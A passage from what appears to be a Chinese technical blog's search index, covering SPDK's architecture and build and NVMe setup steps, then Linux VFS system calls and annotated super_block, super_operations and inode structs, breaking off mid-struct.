<h3 id="网络前端"><a href="#网络前端" class="headerlink" title="网络前端"></a>网络前端</h3><p>网络前端子组件包括DPDK网卡驱动和用户态网络服务UNS（这是一个Linux内核TCP&#x2F;IP协议栈的替代品，能够突破通用TCP&#x2F;IP协议栈的种种性能限制瓶颈）。DPDK在网卡侧提供了一个高性能的发包收包处理框架，在数据从网卡到操作系统用户态之间提供了一条快速通道。</p>
<h3 id="处理框架"><a href="#处理框架" class="headerlink" title="处理框架"></a>处理框架</h3><p>拿到了数据包内容，将iSCSI命令转换为SCSI块级命令。然而，在它将这些命令发到“后端”驱动之前，SPDK提供了一套API框架，让厂商能够插入自己定义的处理逻辑(架构图中绿色的方框)。通过这种机制，存储厂商可在这里实现例如缓存、去重、压缩、加密、RAID计算，或擦除码(Erasure Coding)计算等功能，使这些功能包含在SPDK的处理流程中。</p>
<h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>SPDK和物理块设备交互(读和写操作)。如前所述，SPDK提供了用户态的PMD，支持NVMe设备、Linux AIO设备(传统机械硬盘)、RAMDISK设备，以及利用到英特尔I&#x2F;O加速技术的新设备(CBDMA)。这一系列后端设备驱动涵盖了不同性能的存储分层，保证SPDK几乎与每种存储应用形成关联。</p>
<h1 id="使用及编译"><a href="#使用及编译" class="headerlink" title="使用及编译"></a>使用及编译</h1><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><p>SPDK使用了DPDK中的一些功能，编译SPDK需要依赖DPDK，所以需要先编译安装DPDK</p>
<p>编译DPDK</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">make config T=x86_64-native-linuxapp-gcc</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">make install</span></span><br></pre></td></tr></table></figure>
<p>默认DPDK会安装到<code>/usr/local</code>目录下</p>
<p>编译SPDK</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./configure --with-dpdk=/usr/local</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">make</span></span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>nvme设备插入主机会被系统自动识别。若想使用spdk访问该设备必须现将nvme unbind。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lsblk</span></span><br><span class="line">NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda       8:0    0  7.3T  0 disk</span><br><span class="line">└─sda1    8:1    0  7.3T  0 part /</span><br><span class="line">sdb       8:16   0  7.3T  0 disk</span><br><span class="line">sdc       8:32   0  7.3T  0 disk</span><br><span class="line">sdd       8:48   0  3.8G  0 disk</span><br><span class="line">└─sdd1    8:49   0  3.8G  0 part /boot</span><br><span class="line">nvme0n1 259:0    0  1.5T  0 disk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> &lt;spdk_dir&gt;/scripts</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sh setup.sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lsblk</span></span><br><span class="line">NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda      8:0    0  7.3T  0 disk</span><br><span class="line">└─sda1   8:1    0  7.3T  0 part /</span><br><span class="line">sdb      8:16   0  7.3T  0 disk</span><br><span class="line">sdc      8:32   0  7.3T  0 disk</span><br><span class="line">sdd      8:48   0  3.8G  0 disk</span><br><span class="line">└─sdd1   8:49   0  3.8G  0 part /boot</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.cnblogs.com/whl320124/articles/9969395.html">SPDK简介</a></li>
<li><a href="https://www.jianshu.com/p/6892df050b5a">使用fio测试SPDK</a></li>
<li><a href="https://rootw.github.io/2018/05/SPDK-all/">【SPDK】一、概述</a></li>
<li><a href="https://software.intel.com/content/www/us/en/develop/articles/introduction-to-the-storage-performance-development-kit-spdk.html">Introduction to the Storage Performance Development Kit (SPDK)</a></li>
<li><a href="https://tonydeng.github.io/sdn-handbook/dpdk/spdk.html">SPDK</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>spdk</tag>
      </tags>
  </entry>
  <entry>
    <title>virtual-filesystem-switch</title>
    <url>/2017/09/18/storage/virtual-filesystem-switch/</url>
    <content><![CDATA[<p><img src="/images/vfs/vfs-arch.png" alt="vfs-arch"></p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>引用代码版本：linux-3.10.104</p>
<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ul>
<li>提供一个通用接口</li>
<li>提供各种cache以提高文件系统性能</li>
</ul>
<p><img src="/images/vfs/vfs.png" alt="vfs"></p>
<h1 id="VFS所处理的系统调用"><a href="#VFS所处理的系统调用" class="headerlink" title="VFS所处理的系统调用"></a>VFS所处理的系统调用</h1><table>
<thead>
<tr>
<th align="left">系统调用名</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">mount umount umount2</td>
<td align="left">安装／卸载文件系统</td>
</tr>
<tr>
<td align="left">sysfs</td>
<td align="left">获取文件系统信息</td>
</tr>
<tr>
<td align="left">ustat statfs fstatfs statfs64 fstatfs64</td>
<td align="left">获取文件系统统计信息</td>
</tr>
<tr>
<td align="left">chroot pivot_root</td>
<td align="left">更改根目录</td>
</tr>
<tr>
<td align="left">chdir fchdir getcwd</td>
<td align="left">对当前目录进行操作</td>
</tr>
<tr>
<td align="left">mkdir rmdir</td>
<td align="left">创建、删除目录</td>
</tr>
<tr>
<td align="left">getdents getdents64 readdir link unlink rename lookup_dcookie</td>
<td align="left">对目录项进行操作</td>
</tr>
<tr>
<td align="left">readlink symlink</td>
<td align="left">对软连接进行操作</td>
</tr>
<tr>
<td align="left">chown fchown lchown chown16 fchown16 lchown16</td>
<td align="left">更改文件所有者</td>
</tr>
<tr>
<td align="left">chmod fchmod utime</td>
<td align="left">更改文件属性</td>
</tr>
<tr>
<td align="left">stat fstat lstat access oldstat oldfstat oldlstat</td>
<td align="left">读取文件状态</td>
</tr>
<tr>
<td align="left">stat64 lstat64 fstat64</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">open close creat umask</td>
<td align="left">打开、关闭、创建文件</td>
</tr>
<tr>
<td align="left">dup dup2 fcntl fcntl64</td>
<td align="left">对文件描述符进行操作</td>
</tr>
<tr>
<td align="left">select poll</td>
<td align="left">等待一组文件描述符上发生的事件</td>
</tr>
<tr>
<td align="left">truncate ftruncate truncate64 ftruncate64</td>
<td align="left">更改文件长度</td>
</tr>
<tr>
<td align="left">lseek</td>
<td align="left">更改文件指针</td>
</tr>
<tr>
<td align="left">read write readv writev sendfile sendfile64 readahead</td>
<td align="left">进行文件I&#x2F;O操作</td>
</tr>
<tr>
<td align="left">io_setup io_submit io_getevents io_cancel io_destroy</td>
<td align="left">异步I&#x2F;O</td>
</tr>
<tr>
<td align="left">pread64 pwrite64</td>
<td align="left">搜索并访问文件</td>
</tr>
<tr>
<td align="left">mmap mmap2 munmap madvise mincore remap_file_pages</td>
<td align="left">处理文件内存映射</td>
</tr>
<tr>
<td align="left">fdatasync fsync sync msync</td>
<td align="left">同步文件数据</td>
</tr>
<tr>
<td align="left">flock</td>
<td align="left">处理文件锁</td>
</tr>
<tr>
<td align="left">setxattr lsetxattr fsetxattr getxattr lgetxattr</td>
<td align="left">处理文件扩展属性</td>
</tr>
<tr>
<td align="left">fgetxattr listxattr llistxattr flistxattr removexattr</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">lremovexattr fremovexattr</td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="VFS数据结构"><a href="#VFS数据结构" class="headerlink" title="VFS数据结构"></a>VFS数据结构</h1><ul>
<li>超级块对象和inode对象分别对应有物理数据，在磁盘上有静态信息。</li>
<li>目录项对象和文件对象描述的是一种关系，前者描述的文件与文件名的关系，后者描述的是进程与文件的关系，所以没有对应物理数据</li>
<li>进程每打开一个文件，就会有一个file结构与之对应。同一个进程可以多次打开同一个文件而得到多个不同的file结构，file结构描述被打开文件的属性，如文件的当前偏移量等信息</li>
<li>两个不同的file结构可以对应同一个dentry结构。进程多次打开同一个文件时，对应的只有一个dentry结构</li>
<li>在存储介质中，每个文件对应唯一的inode结点，但是每个文件又可以有多个文件名。</li>
<li>Inode中不存储文件的名字，它只存储节点号；而dentry则保存有名字和与其对应的节点号，所以就可以通过不同的dentry访问同一个inode</li>
</ul>
<p><img src="/images/vfs/vfs_3.10.104.png" alt="vfs_3.10.104.png"></p>
<h2 id="Super-Block"><a href="#Super-Block" class="headerlink" title="Super Block"></a>Super Block</h2><ul>
<li>超级块用来描述特定文件系统的信息。它存放在磁盘特定的扇区中 ,它在使用的时候将信息存在于内存中</li>
<li>当内核对一个文件系统进行初始化和注册时在内存为其分配一个超级块，这就是VFS超级块。即，VFS超级块是各种具体文件系统在安装时建立的，并在这些文件系统卸载时被自动删除</li>
</ul>
<p><img src="/images/vfs/super_block_1.jpg" alt="super_block_1.jpg"></p>
<p> 关键成员：</p>
<ul>
<li>s_list<br>  所有的超级块形成一个双联表，s_list.prev和s_list.next分别指向与当前超级块相邻的前一个元素和后一个元素</li>
<li>s_fs_info<br>  字段指向具体文件系统的超级块。<br>  例如：超级块对象指的是Ext2文件系统，该字段就指向ext2_sb_info数据结构</li>
<li>alloc_super()<br>  超级块对象是通过函数alloc_super()创建并初始化的(由<code>sget()</code>调用，在<code>fs/super.c</code>文件中)。在文件系统安装时，内核会调用该函数以便从磁盘读取文件系统超级块，并且将其信息填充到内存中的超级块对象中</li>
</ul>
<p><code>include/linux/fs.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_list</span>;</span>                 <span class="comment">/* 指向超级块链表的指针 */</span></span><br><span class="line">    <span class="type">dev_t</span>               s_dev;                  <span class="comment">/* 设备标示符 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>       s_blocksize_bits;       <span class="comment">/* 以位为单位的块大小 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       s_blocksize;            <span class="comment">/* 以字节为单位的块大小 */</span></span><br><span class="line">    <span class="type">loff_t</span>              s_maxbytes;             <span class="comment">/* 文件的最长长度 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>     *<span class="title">s_type</span>;</span>        <span class="comment">/* 文件系统类型 */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span>   *<span class="title">s_op</span>;</span>      <span class="comment">/* 超级块方法 */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dquot_operations</span>   *<span class="title">dq_op</span>;</span>     <span class="comment">/* 磁盘限额处理方法*/</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">quotactl_ops</span>   *<span class="title">s_qcop</span>;</span>        <span class="comment">/* 磁盘限额管理方法 */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">export_operations</span> *<span class="title">s_export_op</span>;</span><span class="comment">/* 网络文件系统使用的输出操作 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       s_flags;                <span class="comment">/* 安装标志 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       s_magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>       *<span class="title">s_root</span>;</span>                <span class="comment">/* 文件系统根目录和目录项对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">s_umount</span>;</span>               <span class="comment">/* 卸载文件系统所用的信号量 */</span></span><br><span class="line">    <span class="type">int</span>         s_count;                        <span class="comment">/* 引用计数 */</span></span><br><span class="line">    <span class="type">atomic_t</span>        s_active;                   <span class="comment">/* 次级引用计数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>                    *s_security;        <span class="comment">/* 指向超级块安全数据结构的指针 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xattr_handler</span> **<span class="title">s_xattr</span>;</span>       <span class="comment">/* 指向超级块扩展属性结构的指针*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_inodes</span>;</span>               <span class="comment">/* all inodes */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_head</span>    <span class="title">s_anon</span>;</span>             <span class="comment">/* 用于处理远程网络文件系统的匿名目录项的链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_mounts</span>;</span>               <span class="comment">/* list of mounts; _not_ for fs use */</span></span><br><span class="line">    <span class="comment">/* s_dentry_lru, s_nr_dentry_unused protected by dcache.c lru locks */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_dentry_lru</span>;</span>           <span class="comment">/* unused dentry lru */</span></span><br><span class="line">    <span class="type">int</span>         s_nr_dentry_unused;             <span class="comment">/* # of dentry on lru */</span></span><br><span class="line">    <span class="comment">/* s_inode_lru_lock protects s_inode_lru and s_nr_inodes_unused */</span></span><br><span class="line">    <span class="type">spinlock_t</span>      s_inode_lru_lock ____cacheline_aligned_in_smp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_inode_lru</span>;</span>            <span class="comment">/* unused inode lru */</span></span><br><span class="line">    <span class="type">int</span>         s_nr_inodes_unused;             <span class="comment">/* # of inodes on lru */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">s_bdev</span>;</span>                <span class="comment">/* 指向块设备驱动程序描述符的指针 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">backing_dev_info</span> *<span class="title">s_bdi</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mtd_info</span>     *<span class="title">s_mtd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>   <span class="title">s_instances</span>;</span>            <span class="comment">/* 用于给定文件系统类型的超级块对象链表的指针 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">quota_info</span>   <span class="title">s_dquot</span>;</span>                <span class="comment">/* 磁盘限额的描述符 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sb_writers</span>   <span class="title">s_writers</span>;</span></span><br><span class="line">    <span class="type">char</span> s_id[<span class="number">32</span>];                              <span class="comment">/* Informational name */</span></span><br><span class="line">    u8 s_uuid[<span class="number">16</span>];                              <span class="comment">/* UUID */</span></span><br><span class="line">    <span class="type">void</span>            *s_fs_info;                 <span class="comment">/* 指向特定文件系统的超级块信息的指针 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        s_max_links;</span><br><span class="line">    <span class="type">fmode_t</span>         s_mode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Granularity of c/m/atime in ns. Cannot be worse than a second */</span></span><br><span class="line">    u32        s_time_gran;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The next field is for VFS *only*. No filesystems have any business</span></span><br><span class="line"><span class="comment">     * even looking at it. You had been warned. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">s_vfs_rename_mutex</span>;</span>            <span class="comment">/* Kludge */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Filesystem subtype.  If non-empty the filesystem type field</span></span><br><span class="line"><span class="comment">     * in /proc/mounts will be &quot;type.subtype&quot; */</span></span><br><span class="line">    <span class="type">char</span> *s_subtype;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Saved mount options for lazy filesystems using</span></span><br><span class="line"><span class="comment">     * generic_show_options() */</span></span><br><span class="line">    <span class="type">char</span> __rcu *s_options;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">s_d_op</span>;</span> <span class="comment">/* default d_op for dentries */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Saved pool identifier for cleancache (-1 means none) */</span></span><br><span class="line">    <span class="type">int</span> cleancache_poolid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrinker</span> <span class="title">s_shrink</span>;</span>   <span class="comment">/* per-sb shrinker handle */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of inodes with nlink == 0 but still referenced */</span></span><br><span class="line">    <span class="type">atomic_long_t</span> s_remove_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Being remounted read-only */</span></span><br><span class="line">    <span class="type">int</span> s_readonly_remount;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="super-operation"><a href="#super-operation" class="headerlink" title="super_operation"></a>super_operation</h3><p><code>include/linux/fs.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *(*<span class="title">alloc_inode</span>)(<span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>);</span></span><br><span class="line">    <span class="comment">/* 创建和初始化一个索引节点对象 */</span></span><br><span class="line">    <span class="type">void</span> (*destroy_inode)(<span class="keyword">struct</span> inode *);</span><br><span class="line">    <span class="comment">/* 释放给定的索引节点 */</span></span><br><span class="line">    <span class="type">void</span> (*dirty_inode) (<span class="keyword">struct</span> inode *, <span class="type">int</span> flags);</span><br><span class="line">    <span class="comment">/* VFS在索引节点被修改时会调用这个函数 */</span></span><br><span class="line">    <span class="type">int</span> (*write_inode) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> writeback_control *wbc);</span><br><span class="line">    <span class="comment">/* 将指定的inode写回磁盘 */</span></span><br><span class="line">    <span class="type">int</span> (*drop_inode) (<span class="keyword">struct</span> inode *);</span><br><span class="line">    <span class="comment">/* 最后一个指向索引节点的引用被删除后，VFS会调用这个函数 */</span></span><br><span class="line">    <span class="type">void</span> (*evict_inode) (<span class="keyword">struct</span> inode *);</span><br><span class="line">    <span class="type">void</span> (*put_super) (<span class="keyword">struct</span> super_block *);</span><br><span class="line">    <span class="comment">/* 卸载文件系统时由VFS调用，用来释放超级块 */</span></span><br><span class="line">    <span class="type">int</span> (*sync_fs)(<span class="keyword">struct</span> super_block *sb, <span class="type">int</span> wait);</span><br><span class="line">    <span class="comment">/* 使文件系统中的数据与磁盘上的数据同步 */</span></span><br><span class="line">    <span class="type">int</span> (*freeze_fs) (<span class="keyword">struct</span> super_block *);</span><br><span class="line">    <span class="type">int</span> (*unfreeze_fs) (<span class="keyword">struct</span> super_block *);</span><br><span class="line">    <span class="type">int</span> (*statfs) (<span class="keyword">struct</span> dentry *, <span class="keyword">struct</span> kstatfs *);</span><br><span class="line">    <span class="comment">/* VFS调用该函数获取文件系统状态 */</span></span><br><span class="line">    <span class="type">int</span> (*remount_fs) (<span class="keyword">struct</span> super_block *, <span class="type">int</span> *, <span class="type">char</span> *);</span><br><span class="line">    <span class="comment">/* 定新的安装选项重新安装文件系统时，VFS会调用该函数 */</span></span><br><span class="line">    <span class="type">void</span> (*umount_begin) (<span class="keyword">struct</span> super_block *);</span><br><span class="line">    <span class="comment">/* VFS调用该函数中断安装操作 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*show_options)(<span class="keyword">struct</span> seq_file *, <span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="comment">/* 用来显示特定文件系统的选项 */</span></span><br><span class="line">    <span class="type">int</span> (*show_devname)(<span class="keyword">struct</span> seq_file *, <span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="type">int</span> (*show_path)(<span class="keyword">struct</span> seq_file *, <span class="keyword">struct</span> dentry *);</span><br><span class="line">    <span class="type">int</span> (*show_stats)(<span class="keyword">struct</span> seq_file *, <span class="keyword">struct</span> dentry *);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_QUOTA</span></span><br><span class="line">    <span class="type">ssize_t</span> (*quota_read)(<span class="keyword">struct</span> super_block *, <span class="type">int</span>, <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 限额系统使用该方法从文件中读取数据，该文件详细说明了所在文件系统的限制 */</span></span><br><span class="line">    <span class="type">ssize_t</span> (*quota_write)(<span class="keyword">struct</span> super_block *, <span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 限额系统使用该方法将数据写入文件中，该文件详细说明了所在文件系统的限制 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*bdev_try_to_free_page)(<span class="keyword">struct</span> super_block*, <span class="keyword">struct</span> page*, <span class="type">gfp_t</span>);</span><br><span class="line">    <span class="type">int</span> (*nr_cached_objects)(<span class="keyword">struct</span> super_block *);</span><br><span class="line">    <span class="type">void</span> (*free_cached_objects)(<span class="keyword">struct</span> super_block *, <span class="type">int</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="Inode"><a href="#Inode" class="headerlink" title="Inode"></a>Inode</h2><p><img src="/images/vfs/inode_1.jpg" alt="inode_1.jpg"></p>
<p>索引节点，索引节点与文件一一对应，并且随文件存在而存在。内存中索引节点由一个inode结构表示。</p>
<p><code>include/linux/fs.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="type">umode_t</span>         i_mode;             <span class="comment">/* 文件类型与访问权限 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_opflags;</span><br><span class="line">    <span class="type">kuid_t</span>          i_uid;              <span class="comment">/* inode所属文件的拥有者的id，通过ls -n可查看拥有者id */</span></span><br><span class="line">    <span class="type">kgid_t</span>          i_gid;              <span class="comment">/* inode所属文件所在组的id，通过ls -n可查看组id */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_flags;            <span class="comment">/* 文件系统的安装标志 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FS_POSIX_ACL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span>    *<span class="title">i_acl</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">posix_acl</span>    *<span class="title">i_default_acl</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span>   *<span class="title">i_op</span>;</span>  <span class="comment">/* 索引节点的操作 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span>  *<span class="title">i_sb</span>;</span>              <span class="comment">/* 指向超级块对象的指针 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">i_mapping</span>;</span>     <span class="comment">/* address space */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>            *i_security;            <span class="comment">/* 指向索引节点安全结构的指针 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Stat data, not accessed from path walking */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       i_ino;          <span class="comment">/* 索引节点号 */</span></span><br><span class="line">    <span class="comment">/* Filesystems may only read i_nlink directly.  They shall use the</span></span><br><span class="line"><span class="comment">     * following functions for modification:</span></span><br><span class="line"><span class="comment">     *    (set|clear|inc|drop)_nlink</span></span><br><span class="line"><span class="comment">     *    inode_(inc|dec)_link_count */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> i_nlink;     <span class="comment">/* 硬链接数目，当该inode描述一个目录时，这个值至少为2，代表.和..的数目 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> __i_nlink;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">dev_t</span>           i_rdev;             <span class="comment">/* 如果该inode描述的是一个设备文件，此值为设备号 */</span></span><br><span class="line">    <span class="type">loff_t</span>          i_size;             <span class="comment">/* 文件的字节数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_atime</span>;</span>        <span class="comment">/* 上次访问文件的时间 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_mtime</span>;</span>        <span class="comment">/* 上次写文件的时间，这里的修改只文件内容被修改 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_ctime</span>;</span>        <span class="comment">/* 上次修改索引节点的时间，这里的修改除了指文件内容被修改外，更强调的是文件的属性被修改 */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          i_lock;         <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_bytes;        <span class="comment">/* 文件中最后一个块的字节数 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_blkbits;      <span class="comment">/* 块的位数 */</span></span><br><span class="line">    <span class="type">blkcnt_t</span>            i_blocks;       <span class="comment">/* 文件使用块的个数，通过ls -s可以查看该某个文件的块使用数目 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __NEED_I_SIZE_ORDERED</span></span><br><span class="line">    <span class="type">seqcount_t</span>      i_size_seqcount;    <span class="comment">/* SMP系统为i_size字段获取一致值时使用的顺序计数器 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Misc */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       i_state;        <span class="comment">/* 索引节点的状态标志 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>        <span class="title">i_mutex</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       dirtied_when;   <span class="comment">/* jiffies of first dirtying */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>   <span class="title">i_hash</span>;</span>         <span class="comment">/* 用于散列链表的指针 */</span></span><br><span class="line">    <span class="comment">/* 为了提高查找inode的效率，每一个inode都会有一个hash值。该字段指向hash值相同的inode所形成的双链表该字段包含prev和next两个指针，分别指向上述链表的前一个元素和后一个元素 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_wb_list</span>;</span>      <span class="comment">/* backing dev IO list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_lru</span>;</span>          <span class="comment">/* inode LRU list 所有使用的索引结点形成的双联表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_sb_list</span>;</span>      <span class="comment">/* 用于超级块的索引节点链表的指针 */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>   <span class="title">i_dentry</span>;</span>   <span class="comment">/* 所有引用索引节点的目录项对象链表的头 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">i_rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    u64         i_version;              <span class="comment">/* 版本号（每次使用后自动递增） */</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_count;            <span class="comment">/* 引用计数器 */</span></span><br><span class="line">    <span class="type">atomic_t</span>        i_dio_count;</span><br><span class="line">    <span class="type">atomic_t</span>        i_writecount;       <span class="comment">/* 用于写进程的引用计数器 */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">i_fop</span>;</span> <span class="comment">/* 缺省文件操作 former -&gt;i_op-&gt;default_file_ops */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_lock</span>    *<span class="title">i_flock</span>;</span>           <span class="comment">/* 指向文件锁链表的指针 */</span></span><br><span class="line">    <span class="class"><span 